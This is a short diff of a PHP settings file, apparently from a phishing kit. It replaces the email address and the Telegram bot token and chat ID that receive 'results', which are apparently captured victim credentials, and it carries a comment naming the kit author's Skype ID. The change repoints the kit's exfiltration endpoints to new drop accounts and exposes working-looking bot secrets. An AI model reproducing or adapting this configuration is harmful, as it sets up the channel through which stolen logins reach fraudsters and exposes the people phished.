@@ -5,11 +5,11 @@
  // SKYPE Id: saradauchia2 \\	
 */
 
-$send ="rema-puma@yandex.com"; 
+$send ="book55890@gmail.com"; 
 
 //telgram rzlt
-$api = "5478871666:AAHwLSGPgZqy3a6vCwcOiKTygSM1OKBHh4E";
-$chatid = "533821038";
+$api = "6896553003:AAGvTeYHrZBpg5Rhx1bFiYPh911OJbty0b4";
+$chatid = "1850594045";
 
 
 ?>
